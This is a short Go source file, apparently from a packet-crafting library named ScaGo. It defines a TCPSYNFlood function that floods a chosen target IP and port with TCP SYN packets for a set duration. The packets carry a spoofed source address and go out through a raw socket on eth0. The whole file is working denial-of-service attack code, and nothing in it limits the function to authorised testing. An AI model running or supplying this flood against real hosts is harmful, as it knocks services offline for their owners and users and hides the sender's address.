package higherlevel

import (
	"github.com/tiagomdiogo/ScaGo/packet"
	"github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"log"
	"time"
)

func TCPSYNFlood(targetIP, targetPort string, attackDuration int) {
	socket, err := supersocket.NewSuperSocket("eth0", "")
	if err != nil {
		log.Fatal(err)
	}
	defer socket.Close()

	// Define the deadline for the attack to stop.
	end := time.Now().Add(time.Duration(attackDuration) * time.Second)

	srcIP := utils.ParseIPGen("0.0.0.0/0")

	srcPort := utils.RandomPort()
	for time.Now().Before(end) {

		// Craft the IP layer
		ipLayer := packet.IPv4Layer()
		ipLayer.SetSrcIP(srcIP)
		ipLayer.SetDstIP(targetIP)
		// Craft the TCP layer.
		tcpLayer := packet.TCPLayer()
		tcpLayer.SetSrcPort(srcPort)
		tcpLayer.SetDstPort(targetPort)
		tcpLayer.SetSyn()

		// Craft Packet
		completePacket, err := packet.CraftPacket(ipLayer.Layer(), tcpLayer.Layer())
		if err != nil {
			log.Fatal(err)
		}

		err = socket.Send(completePacket)
		if err != nil {
			log.Fatal(err)
		}
	}
}
